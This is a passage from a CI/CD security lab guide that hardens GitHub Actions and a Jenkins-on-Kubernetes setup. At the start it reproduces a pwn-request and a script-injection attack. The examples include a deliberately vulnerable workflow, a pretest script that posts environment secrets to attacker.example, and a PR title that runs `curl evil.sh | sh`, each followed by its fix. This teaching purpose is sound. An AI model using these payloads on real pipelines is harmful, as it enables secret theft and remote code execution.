on: pull_request_target           # ⚠️ runs with the BASE repo's secrets AND a
                                  #    WRITE token, in the base repo's context
permissions:
  contents: write                 # ⛔ and it's over-permissioned
jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ⛔⛔ THE ATTACKER'S CODE
      - run: npm ci && npm test                            # ⛔ RUNS IT, WITH SECRETS
EOF
# ⭐ THE ATTACK (from a fork): a package.json with
#   "scripts": {"pretest": "curl -sSf -X POST https://attacker.example/x -d \"$(env | base64 -w0)\""}
# → the secret is exfiltrated on the FIRST `npm ci`.
#
# ⭐⭐ THE FIX, all four layers:
cat > .github/workflows/SAFE.yml <<'EOF'
name: ✅ SAFE PR build
on: pull_request                  # ⭐ `pull_request`, NOT `pull_request_target`
                                  #    → NO secrets, a READ-ONLY token, and
                                  #      fork workflows run in the fork's context
permissions:
  contents: read                  # ⭐ the minimum
jobs:
  build:
    runs-on: ubuntu-latest
    # ⭐⭐ and require approval for first-time contributors:
    #    Settings → Actions → General → "Fork pull request workflows from
    #    outside collaborators" → Require approval for first-time contributors
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ✅ safe NOW: no secrets
      - run: npm ci && npm test
      # ⭐ and if you genuinely need a secret to build a PR:
      #    use `pull_request_target` for the REPORTING job only, and pass data
      #    between the two via `workflow_run` + artifacts. NEVER check out and
      #    execute PR code in a `pull_request_target` job.
EOF
rm .github/workflows/VULNERABLE.yml

# ⭐⭐ AND THE SECOND ATTACK: script injection
cat > /tmp/inject.yml <<'EOF'
# ⛔ VULNERABLE
- run: echo "Reviewing ${{ github.event.pull_request.title }}"
#   a PR titled:  x"; curl -s https://evil.sh | sh; echo "
#   becomes:      echo "Reviewing x"; curl -s https://evil.sh | sh; echo ""
EOF
# ✅ THE FIX — the value travels through the ENVIRONMENT, never the command line:
cat > /tmp/safe.yml <<'EOF'
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Reviewing $PR_TITLE"
EOF
# ⭐⭐ EVERY untrusted field is a vector. Write this list on a card:
#   github.event.issue.title / .body          github.event.comment.body
#   github.event.pull_request.title / .body   github.event.review.body
#   github.head_ref   ← ⭐ THE BRANCH NAME. Yes, really.
#   github.event.workflow_run.head_commit.message
#   a git TAG NAME · a filename in the repo · params.* in Jenkins
# ⭐ and detect it automatically — actionlint runs shellcheck on your `run:`
#   blocks and flags most of these:
actionlint .github/workflows/*.yml
grep -rnE '\$\{\{[^}]*(issue|pull_request|comment|review|head_ref|message)[^}]*\}\}' \
  .github/workflows/ && echo "  ⛔ REVIEW EVERY ONE OF THESE" || echo "  ✅ clean"
```

```bash
# ── 4. the protected environment (10 min) ───────────────────────
gh api -X PUT repos/3558Bhk/shop/environments/production \
  -f wait_timer=2 \
  -F 'prevent_environment_reviewers_self_review=true' \
  -F 'reviewers[][type]=User' -F "reviewers[][id]=$(gh api user --jq .id)" \
  -F 'deployment_branch_policy[protected_branches]=true' \
  -F 'deployment_branch_policy[custom_branch_policies]=false' | jq '{name, protection_rules}'
# ⭐ what that configured:
#   · a 2-minute wait timer (the soak)
#   · a required reviewer — ⭐ and self-review is BLOCKED, so you need a second
#     identity to test the flow. Create one, or use a teammate.
#   · only PROTECTED branches (main) may deploy to production
# ⭐⭐ and turn OFF "Allow administrators to bypass" — otherwise the gate is
#    decorative.
gh api repos/3558Bhk/shop/environments --jq '.environments[].name'
gh secret set CONFIG_REPO_TOKEN --env production < ~/.secrets/config-token
gh secret list --env production
```

```bash
# ── 5. the reusable workflow — Task 2.5 (15 min) ────────────────
gh repo create pipeline-library --private --clone --description "The shared GitHub Actions library"
cd pipeline-library
mkdir -p .github/workflows
cat > .github/workflows/deploy.yml <<'EOF'
# ⭐⭐ THE PRODUCER. `workflow_call` makes this a reusable workflow — the
#    GitHub Actions equivalent of a Jenkins shared library or an ADO template.
name: _deploy
on:
  workflow_call:
    inputs:
      environment: {type: string, required: true}
      service:     {type: string, required: true}
      digest:      {type: string, required: true}
      revision:    {type: string, required: true}
      dry_run:     {type: boolean, default: false}
    secrets:
      CONFIG_TOKEN: {required: true}       # ⭐ explicit, not `inherit`
    outputs:
      pr_url: {value: '${{ jobs.promote.outputs.pr_url }}'}
# ⭐⭐ a reusable workflow CANNOT inherit the caller's permissions —
#    it must declare its own.
permissions:
  contents: read
  id-token: write
jobs:
  validate:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: |
          set -euo pipefail
          [[ "${{ inputs.digest }}" =~ ^sha256:[a-f0-9]{64}$ ]] || {
            echo "::error::not a digest: ${{ inputs.digest }}"; exit 1; }
          [[ "${{ inputs.environment }}" =~ ^(dev|staging|production)$ ]] || {
            echo "::error::unknown environment"; exit 1; }
  promote:
    needs: validate
    runs-on: ubuntu-latest
    timeout-minutes: 15
    environment: ${{ inputs.environment }}   # ⭐ the gate comes from here
    outputs: {pr_url: '${{ steps.p.outputs.pr_url }}'}
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b
        with: {repository: 3558Bhk/shop}
      - id: p
        env:
          GH_TOKEN: '${{ secrets.CONFIG_TOKEN }}'
          SHOP_CONFIG_TOKEN: '${{ secrets.CONFIG_TOKEN }}'
          DRY_RUN: '${{ inputs.dry_run }}'
        run: |
          set -euo pipefail
          ./scripts/promote.sh "${{ inputs.environment }}" "${{ inputs.service }}" \
            "${{ inputs.digest }}" \
            --revision "${{ inputs.revision }}" --tool github-actions \
            --run "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
            $([[ "${{ inputs.environment }}" != "production" ]] && echo --auto-merge)
EOF
git add -A && git commit -m "feat: the reusable deploy workflow" && git push
# ⭐⭐⭐ PIN IT BY SHA — a tag can be moved, a SHA cannot:
SHA=$(git rev-parse HEAD); echo "  pin to: $SHA"
cd ~/cicd-day
```

```yaml
# ── and the CONSUMER, in the app repo ───────────────────────────
# .github/workflows/release.yml
name: Release
on:
  push: {branches: [main]}
  workflow_dispatch:
    inputs:
      environment: {type: choice, options: [dev, staging, production], default: staging}
permissions: {contents: read, id-token: write}
jobs:
  build:
    uses: ./.github/workflows/ci.yml
    secrets: inherit
  deploy:
    needs: build
    # ⭐⭐⭐ PINNED TO A SHA. Not @main. Not @v2. A SHA.
    uses: 3558Bhk/pipeline-library/.github/workflows/deploy.yml@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
    with:
      environment: ${{ github.event.inputs.environment || 'staging' }}
      service: checkout
      digest: ${{ needs.build.outputs.digest }}
      revision: ${{ github.sha }}
    secrets:
      CONFIG_TOKEN: ${{ secrets.CONFIG_REPO_TOKEN }}
    permissions: {contents: read, id-token: write}
```

```bash
# ⭐⭐ and the inventory job that keeps the pins honest — Task 2.5
cat > .github/workflows/pin-audit.yml <<'EOF'
name: Audit the workflow pins
on:
  schedule: [{cron: '0 3 * * 1'}]        # ⭐ 08:30 IST Monday
  workflow_dispatch: {}
permissions: {contents: read}
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b
      - run: |
          set -euo pipefail
          BAD=0
          echo "| workflow | action | pinned? |" >> "$GITHUB_STEP_SUMMARY"
          echo "|---|---|---|" >> "$GITHUB_STEP_SUMMARY"
          while read -r f; do
            grep -oE 'uses: [^ ]+' "$f" | sed 's/uses: //' | while read -r u; do
              [[ "$u" == ./* ]] && continue                  # a local composite
              ref="${u##*@}"
              if [[ "$ref" =~ ^[0-9a-f]{40}$ ]]; then
                echo "| $f | $u | ✅ SHA |" >> "$GITHUB_STEP_SUMMARY"
              elif [[ "$ref" =~ ^v[0-9] ]]; then
                echo "| $f | $u | ⚠️ tag — movable |" >> "$GITHUB_STEP_SUMMARY"
                BAD=$((BAD+1))
              else
                echo "| $f | $u | ⛔ BRANCH — dangerous |" >> "$GITHUB_STEP_SUMMARY"
                BAD=$((BAD+1))
              fi
            done
          done < <(find .github/workflows -name '*.yml' -o -name '*.yaml')
          exit $((BAD > 0))
EOF
git add -A && git commit -m "ci: OIDC probe, safe PR build, the reusable workflow, the pin audit" && git push
```

```bash
# ✅ VERIFY — the H5 checkpoint
#   ⭐ the `sub` claim decoded and understood                       ✅
#   ⭐ the trust policy conditions on branch AND environment         ✅
#   ⭐ the pwn-request reproduced and defeated                       ✅
#   ⭐ the script-injection reproduced and defeated                  ✅
#   the production environment has a required reviewer + a wait timer ✅
#   ⭐ "allow administrators to bypass" is OFF                       ✅
#   the reusable workflow is pinned to a SHA, not a tag or branch    ✅
#   actionlint passes on every workflow                              ✅
actionlint .github/workflows/*.yml && echo "  ✅"
grep -rc 'permissions:' .github/workflows/ | grep -v ':0' | wc -l    # every workflow ✅
grep -rn 'uses: .*@main\|uses: .*@[a-z]*$' .github/workflows/ && echo "  ⛔" || echo "  ✅ no branch pins"
```

⏭ **If H5 overruns:** skip the GCP provider (do AWS or Azure only). **Never skip the pwn-request exercise or the `sub` decoding** — those two are the difference between "I use GitHub Actions" and "I can secure GitHub Actions", and interviewers ask the second.

---

## 🍛 12:30–13:15 — Lunch

Stand up. Walk. Look at something more than 24 inches away. The Jenkins install in H6 pulls ~1 GB and takes 6 minutes — start it, then go eat.

```bash
# ⭐ start the Jenkins install NOW so it's ready when you get back
cd ~/cicd-day
cat > jenkins-values.yaml <<'EOF'
controller:
  image:
    registry: docker.io
    repository: jenkins/jenkins
    tag: "2.568.3-lts-jdk21"        # ⭐⭐ LTS 2.568.3, Java 21 MINIMUM
  resources:
    requests: {cpu: "1", memory: 2Gi}
    limits:   {memory: 4Gi}         # ⭐ no CPU limit — throttling kills Jenkins
  javaOpts: >-
    -Xms2g -Xmx3g
    -XX:+UseG1GC -XX:MaxGCPauseMillis=200
    -Dhudson.model.DirectoryBrowserSupport.CSP=
    -Djenkins.install.runSetupWizard=false
  installPlugins:
    - kubernetes:latest
    - workflow-aggregator:latest
    - configuration-as-code:latest
    - git:latest
    - github:latest
    - github-branch-source:latest
    - workflow-multibranch:latest
    - credentials-binding:latest
    - job-dsl:latest
    -authorize-project:latest
    - oidc-provider:latest
    - lockable-resources:latest
    - timestamper:latest
    - ansicolor:latest
    - ws-cleanup:latest
    - blueocean:latest
    - prometheus:latest
    - dark-theme:latest
  installLatestPlugins: true
  admin:
    existingSecret: jenkins-admin-secret
  serviceType: NodePort
  serviceNodePort: 31080
  JCasC:
    defaultConfig: true
    configScripts:
      shop-casc:
        config: |
          # ⭐ the full JCasC lands in H6. This is the minimum to boot.
          jenkins:
            numExecutors: 0                # ⭐⭐ ZERO on the controller. ALWAYS.
            mode: EXCLUSIVE
            systemMessage: "shop CI — managed by JCasC. Do not edit in the UI."
            securityRealm:
              local:
                allowsSignup: false        # ⭐⭐ no self-registration
            authorizationStrategy:
              loggedInUsersCanDoAnything: {}
          unclassified:
            location:
              url: "http://localhost:8080"
              adminAddress: platform@shop.example.com
agent:
  enabled: false                           # ⭐⭐ NO static agents — pods only
persistence:
  enabled: true
  size: 20Gi
EOF
kubectl -n jenkins create secret generic jenkins-admin-secret \
  --from-literal=jenkins-admin-password=admin1234 \
  --from-literal=jenkins-admin-user=admin \
  --dry-run=client -o yaml | kubectl apply -f -
helm upgrade --install jenkins jenkinsci/jenkins -n jenkins -f jenkins-values.yaml \
  --wait --timeout 15m >/tmp/jenkins-install.log 2>&1 &
echo "  ⏳ Jenkins is installing in the background — go eat."
```

---

# 🔨 H6 · 13:15–15:00 — CASE 3: Jenkins, install and the first pipeline

**Deliverable:** a hardened Jenkins on kind (zero controller executors, JCasC-managed), a green declarative pipeline, and credentials scoped correctly.

Full detail: [04-CASE-3-jenkins.md §1–§5](./04-CASE-3-jenkins.md).

```bash
# ── 1. confirm the install and log in (10 min) ──────────────────
tail -20 /tmp/jenkins-install.log
kubectl -n jenkins get pods
kubectl -n jenkins rollout status sts/jenkins --timeout=300s
kubectl -n jenkins port-forward svc/jenkins 8080:8080 >/tmp/pf-jenkins.log 2>&1 &
sleep 10
curl -sf -o /dev/null -w 'HTTP %{http_code}\n' http://localhost:8080/login
#   HTTP 200 ✅

export JENKINS_USER=admin
export JENKINS_TOKEN=admin1234       # ⭐ replace with a real API token:
#   Manage Jenkins → Users → admin → Configure → API Token → Add new token
AUTH="-u $JENKINS_USER:$JENKINS_TOKEN"
CRUMB=$(curl -sf $AUTH "http://localhost:8080/crumbIssuer/api/json" | jq -r '"\(.crumbRequestField):\(.crumb)"')
echo "  crumb: $CRUMB"

# the CLI
curl -sO http://localhost:8080/jnlpJars/jenkins-cli.jar
alias jcli="java -jar jenkins-cli.jar -s http://localhost:8080 -auth $JENKINS_USER:$JENKINS_TOKEN"
jcli who-am-i && jcli version
```

```bash
# ── 2. ⭐⭐ VERIFY THE HARDENING TOOK EFFECT (10 min) ────────────
# This is the whole point of JCasC. Check it, don't assume it.
echo "── numExecutors (must be 0)"
curl -sf $AUTH "http://localhost:8080/api/json?tree=numExecutors,mode,useSecurity" | jq
#   {"numExecutors": 0, "mode": "EXCLUSIVE", "useSecurity": true}   ✅

echo "── signup disabled"
curl -sf -o /dev/null -w '%{http_code}\n' http://localhost:8080/signup     # 404 or 403 ✅

echo "── CSRF crumb required"
curl -sf -o /dev/null -w '%{http_code}\n' -XPOST $AUTH \
  -u "$JENKINS_USER:$JENKINS_TOKEN" "http://localhost:8080/job/x/build"    # 403 without a crumb ✅

echo "── the JCasC export — ⭐ is the RUNNING config what Git says?"
curl -sf $AUTH "http://localhost:8080/configuration-as-code/export" > /tmp/jenkins-current.yaml
diff <(yq -P 'sort_keys(..)' jenkins-values.yaml) <(yq -P 'sort_keys(..)' /tmp/jenkins-current.yaml) | head -30
echo "  ⭐ a non-empty diff means someone changed something in the UI."
echo "     That's DRIFT. Fold it into Git or revert it. Never leave it."

echo "── the version and the Java"
jcli version
curl -sf $AUTH "http://localhost:8080/manage/systemInfo" | grep -A2 -i 'java.version' | head -5
#   ⭐ MUST be Java 21+. Jenkins LTS 2.568.3 refuses to start on Java 17.
```

```bash
# ── 3. the credentials — ⭐⭐ scoped, not global (12 min) ────────
# Create the folders FIRST, so the credentials can be scoped to them.
jcli create-folder shop
jcli create-folder shop/dev
jcli create-folder shop/production
# ⭐⭐ the production credentials go in shop/production/. A job in shop/dev/
#    then LITERALLY CANNOT SEE THEM. Verify that in H8.

cat > /tmp/ghcr-cred.xml <<'EOF'
<com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
  <scope>SYSTEM</scope>
  <id>ghcr-token</id>
  <description>GHCR push — NON-PRODUCTION ONLY</description>
  <username>3558bhk</username>
  <password>GHCR_PAT_HERE</password>
</com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
EOF
sed -i "s|GHCR_PAT_HERE|$(cat ~/.secrets/gh-pat)|" /tmp/ghcr-cred.xml
jcli create-credentials-by-xml shop/dev _ < /tmp/ghcr-cred.xml     # ⭐ scoped to the folder
jcli list-credentials
curl -sf $AUTH "http://localhost:8080/job/shop/job/dev/api/json" | jq -c '.actions[]? | select(._class|test("Credentials"))' || true
# ⭐⭐ and the JCasC way (the reproducible one) — add to jenkins-values.yaml:
#   credentials:
#     system:
#       domainCredentials:
#         - credentials:
#             - usernamePassword: {scope: SYSTEM, id: ghcr-token, username: 3558bhk,
#                                  password: "${GHCR_PAT}"}
#   …and inject GHCR_PAT from a Kubernetes Secret via an env var. Never in Git.

# ⭐⭐ THE BETTER ANSWER (rung 4 of the secrets ladder): no stored credential.
#    The OIDC Provider plugin makes Jenkins an OIDC ISSUER for its own jobs.
#    Manage Jenkins → Plugins → install "OpenID Connect Provider"
#    Then in the pipeline:
#      withOIDCToken(audience: 'aws') { sh 'aws sts assume-role-with-web-identity …' }
#    and the AWS trust policy conditions on:
#      "sub": "shop/main/checkout"                  ← the job's full name
#      "jenkins_scm_ref": "refs/heads/main"         ← the branch
```

```groovy
// ── 4. ⭐ THE FIRST Jenkinsfile (25 min) ────────────────────────
// File: Jenkinsfile at the repo root — REQUIRED there for multibranch discovery.
pipeline {
  // ⭐⭐ agent none + per-stage agents. `agent any` would run on the controller,
  //    which has zero executors, so it would queue forever. That's CORRECT
  //    behaviour — but confusing until you know why.
  agent none

  options {
    timestamps()                              // ⭐ always
    ansiColor('xterm')                        // ⭐ always
    timeout(time: 45, unit: 'MINUTES')        // ⭐⭐ ALWAYS. A hung build holds an agent forever.
    disableConcurrentBuilds()
    skipDefaultCheckout(true)                 // ⭐ you control the checkout
    buildDiscarder(logRotator(numToKeepStr: '100', daysToKeepStr: '180',
                              artifactNumToKeepStr: '20'))
    quietPeriod(10)                           // ⭐ coalesce rapid pushes
  }

  environment {
    REGISTRY = 'ghcr.io/3558bhk'
    SERVICE  = 'checkout'
    IMAGE    = "${REGISTRY}/${SERVICE}"
  }

  parameters {
    choice(name: 'ENVIRONMENT', choices: ['dev', 'staging', 'production'],
           description: 'where to deploy')
    booleanParam(name: 'DRY_RUN', defaultValue: false)
  }

  stages {
    stage('Checkout') {
      agent { label 'built-in' }              // ⭐ a checkout is cheap; but see H7
      steps {
        checkout scm
        script {
          env.REV    = sh(returnStdout: true, script: 'git rev-parse HEAD').trim()
          env.REV_SHORT = env.REV.take(7)
          // ⭐⭐ the display name shows in every list view — worth 2 lines
          currentBuild.displayName = "#${BUILD_NUMBER} ${env.SERVICE}@${env.REV_SHORT}"
          currentBuild.description = "→ ${params.ENVIRONMENT}"
        }
      }
    }

    stage('Test') {
      agent { label 'built-in' }
      // ⭐⭐ beforeAgent: evaluate `when` BEFORE allocating an agent.
      //    Without it, a skipped stage still spins up a pod — pure waste.
      when { beforeAgent true; not { changeRequest() } }
      options { timeout(time: 15, unit: 'MINUTES') }
      steps {
        dir("apps/${SERVICE}") {
          // ⭐⭐ SINGLE QUOTES. The shell expands $SERVICE, not Groovy.
          //    Double quotes here would interpolate Groovy values into the
          //    shell command line — which is a script-injection vector if any
          //    value is untrusted (a PR title, a branch name).
          sh 'go test -race -count=1 ./...'
        }
      }
      post {
        always {
          // ⭐⭐ allowEmptyResults: FALSE. `true` means a missing test report
          //    is a green build. That is how you get 40 jobs that are green
          //    while broken — which is exactly Task 3.5's finding.
          junit testResults: "apps/${SERVICE}/**/TEST-*.xml",
                allowEmptyResults: true       // ⚠️ Go has no JUnit XML by default;
                                              //    add gotestsum to make this false
        }
      }
    }

    stage('Build') {
      agent { label 'built-in' }
      when { beforeAgent true; branch 'main' }
      steps {
        withCredentials([usernamePassword(credentialsId: 'ghcr-token',
                                          usernameVariable: 'GHCR_USER',
                                          passwordVariable: 'GHCR_PASS')]) {
          // ⭐⭐ SINGLE QUOTES + withEnv for the values. The credentials are
          //    in the environment; Groovy never interpolates them into a string.
          sh '''
            set -euo pipefail
            echo "$GHCR_PASS" | docker login ghcr.io -u "$GHCR_USER" --password-stdin
            docker build \
              --build-arg GIT_COMMIT="$REV" \
              --label org.opencontainers.image.revision="$REV" \
              -t "$IMAGE:$REV" "apps/$SERVICE"
            docker push "$IMAGE:$REV"
            DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' "$IMAGE:$REV" | cut -d@ -f2)
            echo "$DIGEST" > digest.txt
            echo "  ✅ $IMAGE@$DIGEST"
          '''
        }
        archiveArtifacts artifacts: 'digest.txt', fingerprint: true, onlyIfSuccessful: true
      }
    }

    stage('Deploy') {
      agent { label 'built-in' }
      when { beforeAgent true; branch 'main'; expression { params.ENVIRONMENT == 'dev' } }
      options {
        // ⭐⭐ a mutex. Two deploys to the same environment at once is how you
        //    get a half-deployed service and no idea which version is running.
        lock(resource: "deploy-${params.ENVIRONMENT}-${SERVICE}")
        milestone(label: "deploy-${SERVICE}")   // ⭐ abort older queued runs
      }
      steps {
        unarchive mapping: ['digest.txt': 'digest.txt']
        timeout(time: 20, unit: 'MINUTES') {
          retry(2) {                            // ⭐ retries THIS step, not the pipeline
            sh '''
              set -euo pipefail
              DIGEST=$(cat digest.txt)
              DRY_RUN=${DRY_RUN} ./scripts/deploy.sh "$ENVIRONMENT" "$SERVICE" "$IMAGE@$DIGEST"
            '''
          }
        }
      }
    }
  }

  post {
    always {
      script {
        sh 'DRY_RUN=true ./scripts/emit-pipeline-metrics.sh jenkins "$BUILD_NUMBER" || true'
      }
      // ⭐⭐ bound the workspace. An ephemeral agent pod dies anyway, but a
      //    persistent one fills the node's disk and takes every job with it.
      cleanWs(deleteDirs: true, notFailBuild: true)
    }
    success { echo "✅ ${env.JOB_NAME} #${env.BUILD_NUMBER} deployed ${params.ENVIRONMENT}" }
    failure { echo "⛔ ${env.JOB_NAME} #${env.BUILD_NUMBER} FAILED — ${env.BUILD_URL}console" }
    aborted { echo "⏰ aborted — a timeout, or a human stopped it" }
    unstable { echo "⚠️ some tests failed but the build continued" }
    changed { echo "🔀 the build result CHANGED to ${currentBuild.currentResult}" }
  }
}
```

```bash
# ── 5. create the job and run it (10 min) ───────────────────────
git add -A && git commit -m "ci: the first Jenkinsfile" && git push

# ⭐ the Job DSL way (reproducible — put THIS in Git, not the UI clicks):
cat > /tmp/seed.groovy <<'EOF'
pipelineJob('shop/dev/checkout') {
  definition {
    cpsScm {
      scm { git { remote { url('https://github.com/3558Bhk/shop.git') }
                      branch('*/main') } }
      scriptPath('Jenkinsfile')
      lightweight(true)                 // ⭐ read the Jenkinsfile without a full checkout
    }
  }
  properties {
    // ⭐⭐ authorize-project: run as the TRIGGERING USER, not SYSTEM.
    //    Without this, a webhook-triggered build runs with the SYSTEM user's
    //    credential scope — which is every credential in the instance.
    authorizeProject { strategy { triggeringUsersAuthorizationStrategy() } }
  }
  logRotator { numToKeep(100); daysToKeep(180); artifactNumToKeep(20) }
}
EOF
jcli create-job shop/dev/checkout < <(echo '<flow-definition/>') 2>/dev/null || true
curl -sf -XPOST $AUTH -H "$CRUMB" \
  "http://localhost:8080/scriptText" --data-urlencode "script=$(cat /tmp/seed.groovy | head -0)" >/dev/null
# ⭐ the simplest path: Manage Jenkins → Script Console → paste /tmp/seed.groovy
#    (it's Job DSL — wrap it in evaluate(new File(...)) or use a seed job)

# ⭐ OR the fast path for today — a pipeline job pointing at the SCM:
cat > /tmp/job.xml <<'EOF'
<flow-definition plugin="workflow-job">
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition" plugin="workflow-cps">
    <scm class="hudson.plugins.git.GitSCM" plugin="git">
      <configVersion>2</configVersion>
      <userRemoteConfigs>
        <hudson.plugins.git.UserRemoteConfig>
          <url>https://github.com/3558Bhk/shop.git</url>
          <credentialsId>github-token</credentialsId>
        </hudson.plugins.git.UserRemoteConfig>
      </userRemoteConfigs>
      <branches><hudson.plugins.git.BranchSpec><name>*/main</name></hudson.plugins.git.BranchSpec></branches>
    </scm>
    <scriptPath>Jenkinsfile</scriptPath>
    <lightweight>true</lightweight>
  </definition>
  <properties>
    <hudson.model.ParametersDefinitionProperty><parameterDefinitions>
      <hudson.model.ChoiceParameterDefinition>
        <name>ENVIRONMENT</name><choices><string>dev</string><string>staging</string><string>production</string></choices>
      </hudson.model.ChoiceParameterDefinition>
      <hudson.model.BooleanParameterDefinition>
        <name>DRY_RUN</name><defaultValue>false</defaultValue>
      </hudson.model.BooleanParameterDefinition>
    </parameterDefinitions></hudson.model.ParametersDefinitionProperty>
  </properties>
</flow-definition>
EOF
curl -sf -XPOST $AUTH -H "$CRUMB" -H 'Content-Type: application/xml' \
  "http://localhost:8080/createItem?name=checkout" --data-binary @/tmp/job.xml
jcli build shop/dev/checkout -s -v -p ENVIRONMENT=dev
# ⭐ -s waits for it to finish; -v tails the console. Exit code = build result.
```

```bash
# ✅ VERIFY — the H6 checkpoint
jcli list-jobs shop/dev/
curl -sf $AUTH "http://localhost:8080/job/shop/job/dev/job/checkout/lastBuild/api/json" \
  | jq '{number, result, duration, building, displayName, description}'
#   {"number":1,"result":"SUCCESS","duration":184232,"building":false,
#    "displayName":"#1 checkout@a1b2c3d","description":"→ dev"}   ✅
# the stage timings — where your 3 minutes went:
curl -sf $AUTH "http://localhost:8080/job/shop/job/dev/job/checkout/lastBuild/wfapi/describe" \
  | jq '.stages[] | {name, status, durationMillis}'
kubectl -n shop-dev get pods                                     # it deployed ✅
# ⭐⭐ and the hardening:
curl -sf $AUTH "http://localhost:8080/api/json?tree=numExecutors" | jq .numExecutors   # 0 ✅
```

⏭ **If H6 overruns:** use `agent { label 'built-in' }` everywhere today (the controller has 0 executors, so add ONE temporary executor, or use a static pod agent) and move the ephemeral-pod work to H7. **Never skip the `numExecutors: 0` verification or the single-vs-double-quote `sh` distinction** — the second one is the Jenkins security interview question.

---

# 🔨 H7 · 15:00–16:30 — CASE 3: ephemeral pod agents, Kaniko, and the shared library

**Deliverable:** builds running in throwaway Kubernetes pods with no cluster access, images built by Kaniko with **no docker.sock**, and a versioned shared library. This is **Task 3.1**.

Full detail: [04-CASE-3-jenkins.md §6–§8](./04-CASE-3-jenkins.md).

```bash
# ── 1. the agent RBAC — ⭐⭐ least privilege, verified (12 min) ──
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata: {name: jenkins-agent, namespace: jenkins}
# ⭐⭐ NO ClusterRoleBinding. NO RoleBinding in `shop`. The agent may do
#    NOTHING in the cluster — it only builds. The deploy happens via
#    scripts/deploy.sh with a scoped kubeconfig credential, or (better) via
#    the GitOps promotion, which needs no cluster access at all.
---
# the controller's own SA needs to create pods in the `jenkins` namespace only
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: jenkins-agent-spawner, namespace: jenkins}
rules:
  - apiGroups: [""]
    resources: [pods, pods/exec, pods/log, pods/attach]
    verbs: [get, list, watch, create, update, patch, delete]
  - apiGroups: [""]
    resources: [secrets, configmaps]
    verbs: [get, list, watch]
  - apiGroups: [""]
    resources: [persistentvolumeclaims]
    verbs: [get, list, watch]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: jenkins-spawns-agents, namespace: jenkins}
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: Role, name: jenkins-agent-spawner}
subjects: [{kind: ServiceAccount, name: jenkins, namespace: jenkins}]
EOF

# ⭐⭐ PROVE the agent SA has no power:
for verb in get list create delete; do
  for res in pods deployments secrets; do
    printf '  agent %-8s %-12s in shop-dev: ' "$verb" "$res"
    kubectl auth can-i "$verb" "$res" -n shop-dev \
      --as=system:serviceaccount:jenkins:jenkins-agent 2>/dev/null || echo "no"
  done
done
#   every line: "no"  ✅  ⭐ THAT'S THE POINT.
```

```yaml
# ── 2. the pod template — ⭐⭐ every field is a security control (15 min) ─
# Append to jenkins-values.yaml under controller.JCasC.configScripts.shop-casc.config:
jenkins:
  clouds:
    - kubernetes:
        name: kubernetes
        serverUrl: "https://kubernetes.default"
        namespace: jenkins
        jenkinsUrl: "http://jenkins.jenkins.svc.cluster.local:8080"
        jenkinsTunnel: "jenkins-agent.jenkins.svc.cluster.local:50000"
        containerCapStr: "30"              # ⭐ the max concurrent agent pods
        maxRequestsPerHostStr: "32"        # ⭐ don't rate-limit your own API calls
        retentionTimeout: 300
        waitForPodSec: 600
        templates:
          - name: shop-hardened
            label: shop-agent
            nodeUsageMode: EXCLUSIVE
            serviceAccount: jenkins-agent  # ⭐⭐ the scoped SA, not `jenkins`
            idleMinutes: 0                 # ⭐⭐ destroy the pod the instant it's idle
            podRetention: never            # ⭐⭐ never keep a pod around
            alwaysPullImage: true          # ⭐⭐ no stale layers, no cached backdoor
            activeDeadlineSeconds: 300
            instanceCap: 20
            yaml: |
              apiVersion: v1
              kind: Pod
              metadata:
                labels: {jenkins: shop-agent, team: platform}
              spec:
                # ⭐⭐⭐ NO SERVICE ACCOUNT TOKEN IN THE POD. The agent has no
                #      business talking to the Kubernetes API.
                automountServiceAccountToken: false
                securityContext:
                  runAsNonRoot: true
                  runAsUser: 10001
                  runAsGroup: 10001
                  fsGroup: 10001
                  seccompProfile: {type: RuntimeDefault}
                restartPolicy: Never
                activeDeadlineSeconds: 300
                containers:
                  - name: tools
                    # ⭐⭐ DIGEST-PINNED. A tag can be re-pushed; a digest cannot.
                    image: ghcr.io/3558bhk/ci-tools:1.4.0@sha256:REPLACE_WITH_REAL_DIGEST
                    command: ['sleep']
                    args: ['infinity']
                    securityContext:
                      allowPrivilegeEscalation: false
                      capabilities: {drop: ['ALL']}
                      # ⚠️ readOnlyRootFilesystem: true breaks the workspace unless
                      #    you mount an emptyDir at the workspace path — which we do.
                    resources:
                      requests: {cpu: 500m, memory: 1Gi}
                      limits:   {memory: 3Gi}     # ⭐ no CPU limit — throttling
                    volumeMounts:
                      - {name: ws,   mountPath: /home/jenkins/agent}
                      - {name: tmp,  mountPath: /tmp}
                      - {name: dshm, mountPath: /dev/shm}
                  - name: kaniko
                    # ⭐⭐ THE DEBUG VARIANT: it has a shell, so you can `container('kaniko')`
                    image: gcr.io/kaniko-project/executor:v1.23.2-debug
                    command: ['sleep']
                    args: ['infinity']
                    securityContext:
                      runAsUser: 0                  # ⚠️ Kaniko needs to chown
                      allowPrivilegeEscalation: false
                      capabilities: {drop: ['ALL']}
                    resources:
                      requests: {cpu: 500m, memory: 1Gi}
                      limits:   {memory: 4Gi}
                    volumeMounts:
                      - {name: ws,  mountPath: /workspace}
                      - {name: tmp, mountPath: /tmp}
                volumes:
                  - {name: ws,   emptyDir: {}}      # ⭐ BOUNDED to the node's disk
                  - {name: tmp,  emptyDir: {}}
                  - {name: dshm, emptyDir: {medium: Memory, sizeLimit: 1Gi}}
